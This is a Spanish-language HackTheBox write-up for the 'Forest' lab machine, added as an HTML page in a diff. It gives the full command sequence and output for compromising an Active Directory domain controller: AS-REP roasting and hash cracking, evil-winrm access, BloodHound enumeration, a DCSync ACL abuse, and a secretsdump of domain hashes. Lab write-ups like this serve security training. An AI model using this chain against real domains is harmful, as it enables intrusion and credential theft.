@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Forest</title>
+
+  <meta name="description" content="Resolución de la máquina Forest de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Forest">
+  <meta name="twitter:description" content="Resolución de la máquina Forest de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/forest.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Forest">
+  <meta property="og:description" content="Resolución de la máquina Forest de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/forest.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/forest.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Forest" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-svc-alfresco">Shell - svc-alfresco</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/forest.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Forest</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos entre ellos <code class="language-plaintext highlighter-rouge">smb</code>, <code class="language-plaintext highlighter-rouge">winrm</code> y otros</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.10.161
+Nmap scan report for 10.10.10.161  
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49670/tcp open  unknown
+49680/tcp open  unknown
+49681/tcp open  unknown
+49685/tcp open  unknown
+49701/tcp open  unknown
+59440/tcp open  unknown</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> conseguimos el <code class="language-plaintext highlighter-rouge">dominio</code> de la máquina victima, <code class="language-plaintext highlighter-rouge">htb.local</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.161
+</span><span class="az">SMB         </span><span class="p">10.10.10.161   445    FOREST           </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Agregamos el domino al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para posibles ataques mas adelante</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.10.161 htb.local"</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si intentamos enumerar recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code> con un null session no podemos hacerlo, asi que probablemente necesitamos credenciales</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ smbclient</span><span class="p"> -N -L 10.10.10.161 
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">rpcclient</code> podemos conectarnos, en este caso permite que nos conectemos sin proporcionar credenciales, asi que enumeramos los <code class="language-plaintext highlighter-rouge">usuarios</code> del dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ rpcclient</span><span class="p"> -N -U </span><span class="am">'' </span><span class="p">10.10.10.161 -c enumdomusers  
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aplicando <code class="language-plaintext highlighter-rouge">expresiones regulares</code> podemos obtener una lista de solo los <code class="language-plaintext highlighter-rouge">usuarios</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ rpcclient</span><span class="p"> -N -U </span><span class="am">'' </span><span class="p">10.10.10.161 -c enumdomusers | </span><span class="ve">grep</span><span class="p"> -oP</span><span class="am"> '\[\D*?\]' </span><span class="p">| </span><span class="ve">tr</span><span class="p"> -d </span><span class="am">'[]'  </span><span class="p">
+Administrator
+Guest
+krbtgt
+DefaultAccount
+sebastien
+lucinda
+svc-alfresco
+andy
+mark
+santi</span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="shell-svc-alfresco">
+<br><h3 class="post-title">Shell - svc-alfresco</h3><br>
+
+<p class="plain-text">Guardamos la lista en un archio <code class="language-plaintext highlighter-rouge">users.txt</code> y con <code class="language-plaintext highlighter-rouge">GetNPUsers</code> podemos aplicar un <code class="language-plaintext highlighter-rouge">ASREPRoast</code> Attack, como resultado obtenemos un <code class="language-plaintext highlighter-rouge">hash</code> del usuario <code class="language-plaintext highlighter-rouge">svc-alfresco</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-GetNPUsers </span><span class="p">htb.local/ -no-pass -usersfile users.txt 
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:48c8e22a848540c95009c837dd0dc91d$14a282620980c10b59951a0c5e604886d4b658ba9a8da0e160dee9d6de49945ca06e63b42974d0505023001051d1950a50651a06c47eb2bea13a41721110c1848f92b8e1a0f047b6722cd4fbc0774ca88dbc2ba3a522a9e34e44ce324104645c11081539db41b3727a3de96531e00015febdab4fe478b7a35356dd651b22de4b1271efe02b6a64df6d681475e87d74bcda943c0aa9b5ba56f7f379adbfaa65c9ee3c3bb732297375b6c8f99e3f9a41d023aaceb34c675aa2f72c1e930bbd965128ec78373271bcd0592da03f6d925e1f1c0d3051cbc6dab1e5ab5930d1659b4a56ffabc9699b  
+[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Guardamos el hash en un archivo llamado <code class="language-plaintext highlighter-rouge">hash</code> y con <code class="language-plaintext highlighter-rouge">john</code> aplicamos fuerza bruta y obtenemos la contraseña de <code class="language-plaintext highlighter-rouge">svc-alfresco</code> en texto plano, que es <code class="language-plaintext highlighter-rouge">s3rvice</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 XOP 4x2])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">s3rvice</span><span class="p">          (</span><span class="am">$krb5asrep$23$svc-alfresco@HTB.LOCAL</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos comprobar con <code class="language-plaintext highlighter-rouge">crackmapexec</code> que son válidas para <code class="language-plaintext highlighter-rouge">smb</code> y listando los recursos no encontramos nada que sea realmente interesante</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares
+</span><span class="az">SMB         </span><span class="p">10.10.10.161   445    FOREST           </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">10.10.10.161   445    FOREST           </span><span class="ve">[+] </span><span class="p">htb.local\svc-alfresco:s3rvice 
+</span><span class="az">SMB         </span><span class="p">10.10.10.161   445    FOREST           </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">10.10.10.161   445    FOREST           </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">10.10.10.161   445    FOREST           </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">10.10.10.161   445    FOREST           </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">10.10.10.161   445    FOREST           </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">10.10.10.161   445    FOREST           </span><span class="am">IPC$                            Remote IPC
+</span><span class="az">SMB         </span><span class="p">10.10.10.161   445    FOREST           </span><span class="am">NETLOGON        READ            Logon server share 
+</span><span class="az">SMB         </span><span class="p">10.10.10.161   445    FOREST           </span><span class="am">SYSVOL          READ            Logon server share</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo <code class="language-plaintext highlighter-rouge">winrm</code> esta abierto y podemos comprobar que tambien son válidas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">winrm 10.10.10.161 -u svc-alfresco -p s3rvice
+</span><span class="az">SMB         </span><span class="p">10.10.10.161   5985   FOREST           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)  
+</span><span class="az">HTTP        </span><span class="p">10.10.10.161   5985   FOREST           </span><span class="az">[*] </span><span class="p">http://10.10.10.161:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">10.10.10.161   5985   FOREST           </span><span class="ve">[+] </span><span class="p">htb.local\svc-alfresco:s3rvice </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>, obtenemos una shell y podemos leer la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i 10.10.10.161 -u svc-alfresco -p s3rvice
+PS C:\Users\svc-alfresco\Documents> </span><span class="am">whoami</span><span class="p">
+htb\svc-alfresco
+PS C:\Users\svc-alfresco\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\user.txt  
+8f9**************************431
+PS C:\Users\svc-alfresco\Documents></span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Subimos <a href="//github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1">SharpHound</a> para enumerar aprovechando la función upload de <code class="language-plaintext highlighter-rouge">evil-winrm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\svc-alfresco\Documents> </span><span class="am">upload </span><span class="p">SharpHound.ps1
+</span><span class="az">
+Info: Uploading SharpHound.ps1 to C:\Users\svc-alfresco\Documents\SharpHound.ps1  
+</span><span class="sa">
+Data: 1757460 bytes of 1757460 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\svc-alfresco\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Importamos el módulo para poder usar sus funciones y usamos <code class="language-plaintext highlighter-rouge">Invoke-BloodHound</code> indicandole que queremos recolectar toda la información del dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\svc-alfresco\Documents> </span><span class="am">Import-Module</span><span class="p"> .\SharpHound.ps1
+PS C:\Users\svc-alfresco\Documents> </span><span class="am">Invoke-BloodHound</span><span class="c1"> -CollectionMethod </span><span class="p">All  
+PS C:\Users\svc-alfresco\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al terminar nos crea un archivo <code class="language-plaintext highlighter-rouge">zip</code> con la información, usando la función <code class="language-plaintext highlighter-rouge">download</code> de <code class="language-plaintext highlighter-rouge">evil-winrm</code> descargamos el archivo comprimido a nuestra máquina local</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\svc-alfresco\Documents> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\Users\svc-alfresco\Documents
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/10/2023  10:29 AM          19055 20230410102922_BloodHound.zip
+-a----        4/10/2023  10:29 AM          20129 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin  
+-a----        4/10/2023  10:27 AM        1318097 SharpHound.ps1
+
+PS C:\Users\svc-alfresco\Documents> </span><span class="am">download </span><span class="p">20230410102922_BloodHound.zip
+</span><span class="az">
+Info: Downloading 20230410102922_BloodHound.zip to ./20230410102922_BloodHound.zip
+
+Info: Download successful!
+</span><span class="p">
+PS C:\Users\svc-alfresco\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Subimos la información a <code class="language-plaintext highlighter-rouge">Bloodhound</code> y en rutas cortas podemos ver que pertenecemos al grupo <code class="language-plaintext highlighter-rouge">Account Operators</code> que tiene privilegios <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre <code class="language-plaintext highlighter-rouge">Exchange Windows Permissions</code> que a su vez tiene el privilegio <code class="language-plaintext highlighter-rouge">WriteDacl</code> sobre el dominio, con el que podemos aplicar un ataque <code class="language-plaintext highlighter-rouge">DCSync</code> para Administrator</p>
+<a href="/htb/forest/1.png" target="_blank"><div><p><img src="/htb/forest/1.png"></p></div></a>   
+
+<p class="plain-text">Iniciamos subiendo el modulo <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a> con la función upload e importandolo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\svc-alfresco\Documents> </span><span class="am">upload </span><span class="p">PowerView.ps1
+</span><span class="az">
+Info: Uploading PowerView.ps1 to C:\Users\svc-alfresco\Documents\PowerView.ps1  
+</span><span class="sa">
+Data: 1027036 bytes of 1027036 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\svc-alfresco\Documents> </span><span class="am">Import-Module</span><span class="p"> .\PowerView.ps1
+PS C:\Users\svc-alfresco\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que nuestro usuario pertenece a <code class="language-plaintext highlighter-rouge">Account Operators</code> creamos un usuario <code class="language-plaintext highlighter-rouge">pwned</code> con a nivel de dominio y lo agregamos al grupo <code class="language-plaintext highlighter-rouge">Exchange Windows Permissions</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\svc-alfresco\Documents> </span><span class="am">net </span><span class="p">user pwned pwned123 /add /domain
+The command completed successfully.
+
+PS C:\Users\svc-alfresco\Documents> </span><span class="am">net </span><span class="p">group </span><span class="az">'Exchange Windows Permissions' </span><span class="p">pwned /add /domain  
+The command completed successfully.
+
+PS C:\Users\svc-alfresco\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Definimos las credenciales de <code class="language-plaintext highlighter-rouge">pwned</code> y con <code class="language-plaintext highlighter-rouge">Add-DomainObjectAcl</code> le otorgamos el permiso para hacer un <code class="language-plaintext highlighter-rouge">DCSync</code> para poder obtener los hashes del <code class="language-plaintext highlighter-rouge">ntds.dit</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\svc-alfresco\Documents> </span><span class="ve">$SecPassword </span><span class="c1">= </span><span class="am">ConvertTo-SecureString </span><span class="az">'pwned123' </span><span class="c1">-AsPlainText -Force</span><span class="p">
+PS C:\Users\svc-alfresco\Documents> </span><span class="ve">$Cred </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">System.Management.Automation.PSCredential(</span><span class="az">'htb.local\pwned'</span><span class="c1">, </span><span class="ve">$SecPassword</span><span class="p">)
+PS C:\Users\svc-alfresco\Documents> </span><span class="am">Add-DomainObjectAcl </span><span class="c1">-Credential </span><span class="ve">$Cred</span><span class="c1"> -TargetIdentity </span><span class="az">'htb.local\Domain Admins' </span><span class="c1">-PrincipalIdentity </span><span class="p">pwned </span><span class="c1">-Rights </span><span class="p">DCSync  
+PS C:\Users\svc-alfresco\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">secretsdump</code> con las credenciales del usuario <code class="language-plaintext highlighter-rouge">pwned</code> podemos dumpear todos los <code class="language-plaintext highlighter-rouge">hashes</code> del <code class="language-plaintext highlighter-rouge">ntds.dit</code> entre ellos el hash del usuario <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-secretsdump </span><span class="p">WORKGROUP/pwned:pwned123@10.10.10.161
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
+htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
+htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
+htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
+htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
+htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
+htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
+htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
+htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
+htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
+htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
+htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
+htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
+htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
+htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
+htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
+htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
+pwned:10101:aad3b435b51404eeaad3b435b51404ee:dc4b6c4a3c30b41b2f86df423144923f:::
+FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:390c36edd672f70068d2a3c97ccc8b8b:::
+EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
+[*] Kerberos keys grabbed
+htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
+htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
+htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
+krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
+krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
+krbtgt:des-cbc-md5:9dd5647a31518ca8
+htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
+htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
+htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
+htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
+htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
+htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
